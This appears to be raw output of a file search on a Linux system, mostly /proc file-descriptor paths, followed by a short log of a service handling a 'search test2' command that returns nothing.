/proc/416/task/422/fd/2
/proc/416/task/422/fdinfo/2
/proc/416/task/423/fd/2
/proc/416/task/423/fdinfo/2
/proc/416/task/424/fd/2
/proc/416/task/424/fdinfo/2
/proc/416/task/425/fd/2
/proc/416/task/425/fdinfo/2
/proc/416/task/426/fd/2
/proc/416/task/426/fdinfo/2
/proc/416/task/428/fd/2
/proc/416/task/428/fdinfo/2
/proc/416/task/1320/fd/2
/proc/416/task/1320/fdinfo/2
/proc/416/task/1666/fd/2
/proc/416/task/1666/fdinfo/2
/proc/416/task/42118/fd/2
/proc/416/task/42118/fdinfo/2
/proc/416/task/42855/fd/2
/proc/416/task/42855/fdinfo/2
/proc/416/fd/2
/proc/416/fdinfo/2
/proc/427/task/427/fd/2
/proc/427/task/427/fdinfo/2
/proc/427/fd/2
/proc/427/fdinfo/2
/proc/924/task/924/fd/2
/proc/924/task/924/fdinfo/2
/proc/924/fd/2
/proc/924/fdinfo/2
/proc/1137/task/1137/fd/2
/proc/1137/task/1137/fdinfo/2
/proc/1137/fd/2
/proc/1137/fdinfo/2
/proc/1149/task/1149/fd/2
/proc/1149/task/1149/fdinfo/2
/proc/1149/task/1150/fd/2
/proc/1149/task/1150/fdinfo/2
/proc/1149/task/1151/fd/2
/proc/1149/task/1151/fdinfo/2
/proc/1149/task/1152/fd/2
/proc/1149/task/1152/fdinfo/2
/proc/1149/task/1153/fd/2
/proc/1149/task/1153/fdinfo/2
/proc/1149/task/1154/fd/2
/proc/1149/task/1154/fdinfo/2
/proc/1149/task/1155/fd/2
/proc/1149/task/1155/fdinfo/2
/proc/1149/fd/2
/proc/1149/fdinfo/2
/proc/1162/task/1162/fd/2
/proc/1162/task/1162/fdinfo/2
/proc/1162/task/1176/fd/2
/proc/1162/task/1176/fdinfo/2
/proc/1162/task/1177/fd/2
/proc/1162/task/1177/fdinfo/2
/proc/1162/task/1178/fd/2
/proc/1162/task/1178/fdinfo/2
/proc/1162/task/1179/fd/2
/proc/1162/task/1179/fdinfo/2
/proc/1162/task/1180/fd/2
/proc/1162/task/1180/fdinfo/2
/proc/1162/task/1183/fd/2
/proc/1162/task/1183/fdinfo/2
/proc/1162/fd/2
/proc/1162/fdinfo/2
/proc/1207/task/1207/fd/2
/proc/1207/task/1207/fdinfo/2
/proc/1207/task/1208/fd/2
/proc/1207/task/1208/fdinfo/2
/proc/1207/task/1209/fd/2
/proc/1207/task/1209/fdinfo/2
/proc/1207/task/1210/fd/2
/proc/1207/task/1210/fdinfo/2
/proc/1207/task/1211/fd/2
/proc/1207/task/1211/fdinfo/2
/proc/1207/task/1212/fd/2
/proc/1207/task/1212/fdinfo/2
/proc/1207/task/1213/fd/2
/proc/1207/task/1213/fdinfo/2
/proc/1207/task/1214/fd/2
/proc/1207/task/1214/fdinfo/2
/proc/1207/task/1215/fd/2
/proc/1207/task/1215/fdinfo/2
/proc/1207/task/1216/fd/2
/proc/1207/task/1216/fdinfo/2
/proc/1207/task/1217/fd/2
/proc/1207/task/1217/fdinfo/2
/proc/1207/task/1224/fd/2
/proc/1207/task/1224/fdinfo/2
/proc/1207/task/1225/fd/2
/proc/1207/task/1225/fdinfo/2
/proc/1207/fd/2
/proc/1207/fdinfo/2
/proc/1218/task/1218/fd/2
/proc/1218/task/1218/fdinfo/2
/proc/1218/task/1226/fd/2
/proc/1218/task/1226/fdinfo/2
/proc/1218/task/1227/fd/2
/proc/1218/task/1227/fdinfo/2
/proc/1218/task/1228/fd/2
/proc/1218/task/1228/fdinfo/2
/proc/1218/task/1229/fd/2
/proc/1218/task/1229/fdinfo/2
/proc/1218/task/1230/fd/2
/proc/1218/task/1230/fdinfo/2
/proc/1218/task/1231/fd/2
/proc/1218/task/1231/fdinfo/2
/proc/1218/fd/2
/proc/1218/fdinfo/2
/proc/1239/task/1239/fd/2
/proc/1239/task/1239/fdinfo/2
/proc/1239/task/1240/fd/2
/proc/1239/task/1240/fdinfo/2
/proc/1239/task/1241/fd/2
/proc/1239/task/1241/fdinfo/2
/proc/1239/task/1242/fd/2
/proc/1239/task/1242/fdinfo/2
/proc/1239/task/1243/fd/2
/proc/1239/task/1243/fdinfo/2
/proc/1239/task/1244/fd/2
/proc/1239/task/1244/fdinfo/2
/proc/1239/task/1245/fd/2
/proc/1239/task/1245/fdinfo/2
/proc/1239/task/1246/fd/2
/proc/1239/task/1246/fdinfo/2
/proc/1239/task/1247/fd/2
/proc/1239/task/1247/fdinfo/2
/proc/1239/task/1248/fd/2
/proc/1239/task/1248/fdinfo/2
/proc/1239/task/1249/fd/2
/proc/1239/task/1249/fdinfo/2
/proc/1239/task/1250/fd/2
/proc/1239/task/1250/fdinfo/2
/proc/1239/task/1511/fd/2
/proc/1239/task/1511/fdinfo/2
/proc/1239/task/1514/fd/2
/proc/1239/task/1514/fdinfo/2
/proc/1239/task/1659/fd/2
/proc/1239/task/1659/fdinfo/2
/proc/1239/fd/2
/proc/1239/fdinfo/2
/proc/1319/task/1319/fd/2
/proc/1319/task/1319/fdinfo/2
/proc/1319/fd/2
/proc/1319/fdinfo/2
/proc/1665/task/1665/fd/2
/proc/1665/task/1665/fdinfo/2
/proc/1665/fd/2
/proc/1665/fdinfo/2
/proc/2185/task/2185/fd/2
/proc/2185/task/2185/fdinfo/2
/proc/2185/task/2186/fd/2
/proc/2185/task/2186/fdinfo/2
/proc/2185/task/2187/fd/2
/proc/2185/task/2187/fdinfo/2
/proc/2185/task/2188/fd/2
/proc/2185/task/2188/fdinfo/2
/proc/2185/task/2189/fd/2
/proc/2185/task/2189/fdinfo/2
/proc/2185/task/2190/fd/2
/proc/2185/task/2190/fdinfo/2
/proc/2185/task/2191/fd/2
/proc/2185/task/2191/fdinfo/2
/proc/2185/task/2195/fd/2
/proc/2185/task/2195/fdinfo/2
/proc/2185/task/2196/fd/2
/proc/2185/task/2196/fdinfo/2
/proc/2185/task/78888/fd/2
/proc/2185/task/78888/fdinfo/2
/proc/2185/fd/2
/proc/2185/fdinfo/2
/proc/42117/task/42117/fd/2
/proc/42117/task/42117/fdinfo/2
/proc/42117/fd/2
/proc/42117/fdinfo/2
/proc/42854/task/42854/fd/2
/proc/42854/task/42854/fdinfo/2
/proc/42854/fd/2
/proc/42854/fdinfo/2
/proc/79146/task/79146/fd/2
/proc/79146/task/79146/fdinfo/2
/proc/79146/fd/2
/proc/79146/fdinfo/2
/proc/79157/task/79157/fd/2
/proc/79157/task/79157/fdinfo/2
/proc/79157/fd/2
/proc/79157/fdinfo/2
/proc/79565/task/79565/fd/2
/proc/79565/task/79565/fdinfo/2
/proc/79565/task/79571/fd/2
/proc/79565/task/79571/fdinfo/2
/proc/79565/fd/2
/proc/79565/fdinfo/2
/proc/79570/task/79570/fd/2
/proc/79570/task/79570/fdinfo/2
/proc/79570/fd/2
/proc/79570/fdinfo/2
/proc/80326/task/80326/fd/2
/proc/80326/task/80326/fdinfo/2
/proc/80326/fd/2
/proc/80326/fdinfo/2
/proc/80327/task/80327/fd/2
/proc/80327/task/80327/fdinfo/2
/proc/80327/fd/2
/proc/80327/fdinfo/2
/proc/80328/task/80328/fd/2
/proc/80328/task/80328/fdinfo/2
/proc/80328/fd/2
/proc/80328/fdinfo/2
/proc/80329/task/80329/fd/2
/proc/80329/task/80329/fdinfo/2
/proc/80329/fd/2
/proc/80329/fdinfo/2
/usr/local/lib/python3.12/site-packages/jedi/third_party/typeshed/third_party/2
/usr/local/lib/python3.12/site-packages/jedi/third_party/typeshed/stdlib/2
/dev/pts/2

2024-06-29 13:46:50,431 - INFO - Received command: search test2
2024-06-29 13:46:50,431 - INFO - Handling search for file: test2
2024-06-29 13:46:50,571 - INFO - Command output: 
